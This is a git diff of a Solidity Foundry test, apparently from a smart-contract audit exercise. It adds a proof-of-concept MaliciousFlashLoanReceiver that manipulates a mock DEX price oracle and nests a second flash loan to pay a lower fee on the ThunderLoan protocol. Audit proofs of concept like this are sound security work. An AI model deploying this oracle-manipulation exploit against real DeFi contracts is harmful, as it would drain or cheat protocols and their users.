@@ -165,21 +165,30 @@ contract ThunderLoanTest is BaseTest {
        //0.296147410319118389 Now lets reduce this
 
        uint256 amountToBorrow=50e18; // we doign this twice
+       MaliciousFlashLoanReceiver flr=new MaliciousFlashLoanReceiver(address(tswapPool),address(thunderLoan),address(thunderLoan.getAssetFromToken(tokenA)));
+       vm.startPrank(user);
+       tokenA.mint(address(flr),100e18);
+       thunderLoan.flashloan(address(flr),tokenA,amountToBorrow,"");
+       vm.stopPrank();
+
+       uint256 attackFee=flr.feeOne()+flr.feeTwo();
+       console.log("Attack Fee is : ", attackFee);
+       assert(attackFee<normalFeeCost);
     }
     
 }
 
 contract MaliciousFlashLoanReceiver is IFlashLoanReceiver{
-    ThunderLoan thunderloan;
+    ThunderLoan thunderLoan;
     address repayAddress;
     BuffMockTSwap tswapPool;
     bool attacked;
-    uint256 feeOne;
-    uint256 feeTwo;
+    uint256 public feeOne;
+    uint256 public feeTwo;
 
     constructor(address _tswapPool,address _thunderloan,address _repayAddress){
         tswapPool=BuffMockTSwap(_tswapPool);
-        thunderloan=ThunderLoan(_thunderloan);
+        thunderLoan=ThunderLoan(_thunderloan);
         repayAddress=_repayAddress;
     }
 
@@ -195,11 +204,30 @@ contract MaliciousFlashLoanReceiver is IFlashLoanReceiver{
             //2.Take out another loan to show the fee difference
             feeOne=fee;
             attacked=true;
-            uint256 wethBought=tswapPool.getOutputBasedOnInput(50e18,100e18,100e18);
+            uint256 wethBought=tswapPool.getOutputAmountBasedOnInput(50e18,100e18,100e18);
+            IERC20(token).approve(address(tswapPool),50e18);
+            tswapPool.swapWethForPoolTokenBasedOnInputWeth(50e18,wethBought,block.timestamp);
+            //we call second flash loan
+            thunderLoan.flashloan(address(this),IERC20(token),amount,"");
+            //repay
+            // IERC20(token).approve(address(thunderLoan),amount+fee);
+            // thunderLoan.repay(IERC20(token),amount+fee);
+
+            IERC20(token).transfer(address(repayAddress),amount+fee);
         } else{
             //calcalute te fee and pay
+            feeTwo=fee;
+            //repay
+            // IERC20(token).approve(address(thunderLoan),amount+fee);
+            // thunderLoan.repay(IERC20(token),amount+fee);
+            IERC20(token).transfer(address(repayAddress),amount+fee);
+
         }
+        return true;
     }
 
 }
+
+//IMPACT : Medium/Low : Users are getting chepaer fee
+// LIKELYHOOD: High -> users 
 
